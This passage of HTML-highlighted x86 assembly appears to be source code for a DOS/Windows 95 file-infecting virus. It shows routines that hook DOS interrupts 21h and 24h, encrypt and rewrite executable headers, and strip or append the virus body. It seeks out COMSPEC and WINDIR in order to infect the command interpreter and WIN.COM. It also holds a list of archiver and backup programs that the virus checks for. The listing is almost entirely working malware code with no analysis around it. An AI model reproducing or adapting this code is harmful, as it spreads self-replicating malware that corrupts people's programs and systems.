                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">

                </span><span class="sc6">STOSW</span><span class="sc0">

                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">Copy_Crypt_W</span><span class="sc0">

                </span><span class="sc6">LODSW</span><span class="sc0">
                </span><span class="sc6">STOSW</span><span class="sc0">

                </span><span class="sc6">LODSW</span><span class="sc0">
                </span><span class="sc6">STOSW</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POPA</span><span class="sc0">

                </span><span class="sc6">RETN</span><span class="sc0">


</span><span class="sc5">Archivers</span><span class="sc0">       </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">09</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'PKZIP.EXE'</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">07</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'ARJ.EXE'</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">07</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'LHA.EXE'</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">07</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'RAR.EXE'</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'BACKUP.EXE'</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">07</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'FTP.EXE'</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">Get_DTA</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2F00h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Century</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt21h</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">CWD</span><span class="sc0">                             </span><span class="sc1">; Zero DX.</span><span class="sc0">

                </span><span class="sc6">RETN</span><span class="sc0">



</span><span class="sc5">Check_Clean</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">PUSHF</span><span class="sc0">
                </span><span class="sc6">PUSHA</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Hook_Int24h</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Check_Handle</span><span class="sc0">
                </span><span class="sc6">JS</span><span class="sc0">      </span><span class="sc5">Exit_Clean_H</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Exit_Clean_H</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Save_File_Pos</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Seek_Header</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Read_Header</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Crypt_Header</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Write_Header</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4202h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">Virus_Size</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt21h</span><span class="sc0">

                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">                      </span><span class="sc1">; Cut-off virusbody.</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Write_File</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Restore_File_Pos</span><span class="sc0">

                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">File_Date</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Century</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Restore_File_Stamp</span><span class="sc0">

</span><span class="sc5">Exit_Clean_H</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Unhook_Int24h</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">POPA</span><span class="sc0">
                </span><span class="sc6">POPF</span><span class="sc0">

                </span><span class="sc6">RETN</span><span class="sc0">


</span><span class="sc5">Hook_Int24h</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">PUSHA</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3524h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt21h</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Int24h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Int24h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">NewInt24h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt21h</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">POPA</span><span class="sc0">

                </span><span class="sc6">RETN</span><span class="sc0">


</span><span class="sc5">Unhook_Int24h</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2524h</span><span class="sc0">
                </span><span class="sc6">LDS</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Int24h</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">OldInt21h</span><span class="sc0">


</span><span class="sc5">NewInt24h</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">

                </span><span class="sc6">IRET</span><span class="sc0">


</span><span class="sc5">Save_File_Pos</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4201h</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">CWD</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt21h</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">File_Pos_Lo</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">File_Pos_Hi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">

                </span><span class="sc6">RETN</span><span class="sc0">


</span><span class="sc5">Restore_File_Pos</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4200h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">File_Pos_Hi</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">File_Pos_Lo</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">OldInt21h</span><span class="sc0">


</span><span class="sc5">Seek_Header</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4202h</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">28</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">OldInt21h</span><span class="sc0">


</span><span class="sc5">Read_Header</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Header</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Read_File</span><span class="sc0">
                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">Exit_Read_Hdr</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">

</span><span class="sc5">Exit_Read_Hdr</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">RETN</span><span class="sc0">


</span><span class="sc5">Read_File</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">OldInt21h</span><span class="sc0">


</span><span class="sc5">Write_Header</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Go_BOF</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">                  </span><span class="sc1">; Write updated header.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">

</span><span class="sc5">Write_File</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">OldInt21h</span><span class="sc0">



</span><span class="sc1">; Converts characters in AX to uppercase.</span><span class="sc0">
</span><span class="sc5">Make_Uppercase</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'a'</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Check_Upper_AH</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'z'</span><span class="sc0">
                </span><span class="sc6">JA</span><span class="sc0">      </span><span class="sc5">Check_Upper_AH</span><span class="sc0">

                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'a'</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc0">

</span><span class="sc5">Check_Upper_AH</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'a'</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Exit_Uppercase</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'z'</span><span class="sc0">
                </span><span class="sc6">JA</span><span class="sc0">      </span><span class="sc5">Exit_Uppercase</span><span class="sc0">

                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'a'</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc0">

</span><span class="sc5">Exit_Uppercase</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">RETN</span><span class="sc0">



</span><span class="sc5">Check_Handle</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4400h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt21h</span><span class="sc0">

                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">
                </span><span class="sc6">JS</span><span class="sc0">      </span><span class="sc5">Exit_Chk_File</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Save_File_Stamp</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SP</span><span class="sc0">

                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc0">

                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">

</span><span class="sc5">Exit_Chk_File</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">RETN</span><span class="sc0">


</span><span class="sc5">Infect_ComSpec</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">PUSHA</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">62h</span><span class="sc0">                 </span><span class="sc1">; Get current PSP.</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">2Ch</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">Comp_Env_Var</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">             </span><span class="sc1">; End of settings reached?</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">Exit_Inf_ComSpec</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Make_Uppercase</span><span class="sc0">

                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Make_Uppercase</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'OC'</span><span class="sc0">                </span><span class="sc1">; Look for 'COMSPEC='.</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Test_4_Win_Dir</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'CE'</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Test_4_Win_Dir</span><span class="sc0">

</span><span class="sc5">Found_ComSpec</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3D00h</span><span class="sc0">               </span><span class="sc1">; Infect command-interpreter.</span><span class="sc0">
                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">Test_4_Win_Dir</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'IW'</span><span class="sc0">                </span><span class="sc1">; Look for 'WINDIR='.</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Get_Next_Var</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'=R'</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Get_Next_Var</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Filename_Buffer</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">

</span><span class="sc5">Copy_Byte_W_D</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CLD</span><span class="sc0">
                </span><span class="sc6">LODSB</span><span class="sc0">

                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">Win_Dir_Copied</span><span class="sc0">

                </span><span class="sc6">STOSB</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Copy_Byte_W_D</span><span class="sc0">

</span><span class="sc5">Win_Dir_Copied</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Win95_Init</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
                </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">MOVSB</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Dh</span><span class="sc0">                 </span><span class="sc1">; Infect WIN.COM.</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">

</span><span class="sc5">Get_Next_Var</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CLD</span><span class="sc0">

</span><span class="sc5">Find_Next_Var</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">LODSB</span><span class="sc0">

                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Find_Next_Var</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Comp_Env_Var</span><span class="sc0">

</span><span class="sc5">Exit_Inf_ComSpec</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">POPA</span><span class="sc0">

                </span><span class="sc6">RETN</span><span class="sc0">


                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0EAh</span><span class="sc0">

</span><span class="sc5">Check_4_EXE</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.EXE_Mark</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">

                </span><span class="sc6">RETN</span><span class="sc0">


</span><span class="sc5">Win95_Init</span><span class="sc0">      </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'\WIN.COM'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">MOD</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">EQ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">


</span><span class="sc5">End_Encrypted</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">Host_Bytes</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc12">'ZM'</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Carrier</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Virus_End</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">Int24h</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">File_Name</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Header</span><span class="sc0">          </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">40h</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Filename_Buffer</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Buffer</span><span class="sc0">          </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc5">Virus_Size</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Virus_End_Mem</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">Carrier</span><span class="sc4">:</span><span class="sc0">
